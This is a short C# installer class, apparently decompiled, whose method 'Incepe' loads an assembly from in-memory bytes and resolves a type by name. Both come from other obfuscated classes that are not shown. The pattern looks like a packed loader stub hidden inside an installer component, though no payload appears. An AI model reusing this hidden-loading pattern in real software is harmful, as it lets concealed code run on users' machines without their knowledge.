using System;
using System.ComponentModel;
using System.Configuration.Install;

namespace dsui;

[RunInstaller(true)]
public class Installer19 : Installer
{
	private IContainer components;

	internal static Type Incepe()
	{
		return AppDomain.CurrentDomain.Load(Installer38.Tai()).GetType(Installer33.Rk());
	}

	public Installer19()
	{
		InitializeComponent();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Component)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		components = new Container();
	}
}
